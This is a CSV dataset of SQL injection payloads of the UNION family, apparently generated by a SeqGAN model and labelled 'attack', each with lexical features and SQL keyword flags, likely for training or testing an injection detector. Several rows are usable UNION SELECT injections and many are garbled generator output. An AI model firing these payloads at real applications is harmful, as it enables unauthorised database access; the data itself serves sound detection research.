label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-2190""  )    union all select 1,1441,3059,3072,5756,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,19,58.0,25.0,4.316202064048919,14.0,25.0,9.0,10.0,0.2413793103448276,0.43103448275862066,0.15517241379310345,0.1724137931034483,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-"" union all * where  =  )     )     )   union 1 4854 users,4266ersis@$as users  )sio  sers union all all u,vers wheresv@VE  VEEE@<ounion 1-- 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,20,143.0,30.0,4.11216529158306,77.0,11.0,38.0,17.0,0.5384615384615384,0.07692307692307693,0.26573426573426573,0.11888111888111888,0.0,1.0,3.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.0,6.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-6097""  )    )     )    union all select usrsersid  =  as union select   @VERSION --,j,1 sers@,4266--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,21,101.0,34.0,4.217318518886011,48.0,9.0,29.0,15.0,0.4752475247524752,0.0891089108910891,0.2871287128712871,0.1485148514851485,0.0,1.0,5.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,3.0,6.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'    )    )   union select null,9357,1249,7497,9357#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,22,53.0,21.0,3.923854580220536,15.0,17.0,13.0,8.0,0.2830188679245283,0.32075471698113206,0.24528301886792453,0.1509433962264151,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-8521' union all select 3990,9988,8986,9921,3990#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,23,49.0,23.0,4.127080191266614,14.0,24.0,4.0,7.0,0.2857142857142857,0.4897959183673469,0.08163265306122448,0.14285714285714285,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-""   )     )     )    \as union all us where id  =  =  1 1646  =  1 union all select ,6737,null,5756,3480,5756,2263,5756,3072,9814,1646,7348,null,4300,5756,8123,8665,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,24,171.0,32.0,4.251248007334919,41.0,66.0,37.0,27.0,0.23976608187134502,0.38596491228070173,0.21637426900584794,0.15789473684210525,0.0,1.0,1.0,0.0,0.0,3.0,0.0,3.0,0.0,0.0,17.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-4373  vhve""s where   ==  =  2011 $$  =  1 iselect all select from where @ 1917 us u,v@.ES   )    )     )    us where id  =  v$ 1646  (     unionselect 1,3072,null,1249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,25,168.0,37.0,4.161574544736544,66.0,26.0,55.0,21.0,0.39285714285714285,0.15476190476190477,0.3273809523809524,0.125,0.0,1.0,1.0,0.0,0.0,5.0,0.0,4.0,0.0,0.0,4.0,6.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,-43732639 union all union from ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,26,31.0,17.0,3.8213119401041733,17.0,8.0,5.0,1.0,0.5483870967741935,0.25806451612903225,0.16129032258064516,0.03225806451612903,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack," * $ 7815  =  =  )    )  union all from null, 1646,9814,1249,6996 ersion where union 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,27,86.0,27.0,4.089802220063814,32.0,21.0,23.0,10.0,0.37209302325581395,0.2441860465116279,0.26744186046511625,0.11627906976744186,0.0,0.0,0.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,4.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-%'  =    8268  )    union all from usersi)   union $ @Eselect usersisiod  2088    )    )    )    )    union _,1646",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,28,115.0,31.0,3.7347245318773066,45.0,12.0,44.0,14.0,0.391304347826087,0.10434782608695652,0.3826086956521739,0.12173913043478261,1.0,0.0,1.0,0.0,0.0,1.0,0.0,6.0,1.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-s'  )  )    )    union * select from @ @Vs,v9110ioers id  =  '1' union all all union @(I+$   )    )    union all select u,7497#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,29,128.0,34.0,4.061427389809403,58.0,9.0,41.0,20.0,0.453125,0.0703125,0.3203125,0.15625,3.0,0.0,1.0,0.0,1.0,1.0,0.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack," 1494  )   )    )    O   union where 1917  (,4481--,5349er  )    )     )   whereunion all l,7845,5756,8123,null,1441,2263,9988,8123#,8665,7348,1224,5756,3072,4600--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,30,164.0,27.0,4.154026756589949,31.0,68.0,37.0,28.0,0.18902439024390244,0.4146341463414634,0.22560975609756098,0.17073170731707318,0.0,0.0,4.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,16.0,4.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6253' union all all select 1,vers -- users where idid  =  2571  . union all all select 6737,7348,3072,3072,4854,7348,7845,3072,2263,7348,null,1441,1441,9921--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,31,160.0,32.0,4.521405116233759,56.0,61.0,20.0,23.0,0.35,0.38125,0.125,0.14375,1.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,14.0,6.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"-)'  )    )    union all  1 -- 1917,4266,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,32,47.0,17.0,3.491442321662147,8.0,13.0,15.0,11.0,0.1702127659574468,0.2765957446808511,0.3191489361702128,0.23404255319148937,1.0,0.0,5.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-4205's all all 4854 ,7845,7348,4854,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,33,42.0,16.0,3.617809684374455,7.0,24.0,4.0,7.0,0.16666666666666666,0.5714285714285714,0.09523809523809523,0.16666666666666666,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
